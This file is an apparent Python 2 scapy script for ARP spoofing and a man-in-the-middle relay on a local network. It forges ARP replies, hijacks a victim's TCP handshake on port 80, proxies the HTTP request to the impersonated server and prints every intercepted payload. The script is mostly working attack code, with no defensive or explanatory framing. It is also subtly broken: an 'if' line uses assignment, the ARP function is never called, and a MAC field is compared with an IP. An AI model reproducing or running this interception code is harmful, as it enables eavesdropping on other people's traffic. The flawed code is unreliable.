from scapy.all import *

def ARPPoison(macAttacker, macVictim, ipToSpoof, ipVictim):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp)

def forward(p):
    if p.src = ipToSpoof:
        print p.load
        global seq, ack
        tcpLayer = TCP(sport = 80, dport = port, flags = "PA", seq = seq, ack = ack, options = [('MSS', 1460)])
        answer = sr1(ipLayerC / tcpLayer / p.load)
        seq = answer.ack
    else:
        print p.load
        

ipToSpoof = "192.168.56.102"
ipSelf = "192.168.56.103"
print "Listening as " + ipSelf

# TCP handshake with client
a = sniff(count = 1, filter = "tcp and port 80 and host " + ipSelf)
ipVictim = a[0][IP].src
port = a[0].sport
seq = a[0].seq
ack = a[0].seq + 1
print "Connection from " + ipVictim + ":" + str(port)

ipLayerC = IP(src = ipSelf, dst = ipVictim)
synAck = TCP(sport = 80, dport = port, flags = "SA", seq = seq, ack = ack, options = [('MSS', 1460)])
answer = sr1(ipLayerC / synAck)
print "Handshake 1 completed"
print "---------------------"

# Forward and log http requests
incRequest = sniff(count = 1, filter = "tcp and port 80")
ack = ack + len(incRequest[0].load)
seq = seq + 1
print incRequest[0].load

# TCP handshake with server
ipLayerS = IP(src = ipSelf, dst = ipToSpoof)
tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = 1000)
answer = sr1(ipLayerS / tcpLayer)
tcpLayer = TCP(sport = port, dport = 80, flags = "A", seq = answer.ack, ack = answer.seq + 1)
send(ipLayerS / tcpLayer)
print "Handshake 2 completed"
print "---------------------"

tcpLayer = TCP(sport = port, dport = 80, flags = incRequest[0][TCP].flags, seq = answer.ack, ack = answer.seq + 1)
answer = sr1(ipLayerS / tcpLayer / incRequest[0].load)
sniff(filter = "tcp and host " + ipSelf, prn = forward)

tcpLayer = TCP(sport = 80, dport = port, flags = "FA", seq = seq, ack = ack, options = [('MSS', 1460)])
send(ipLayerC / tcpLayer)
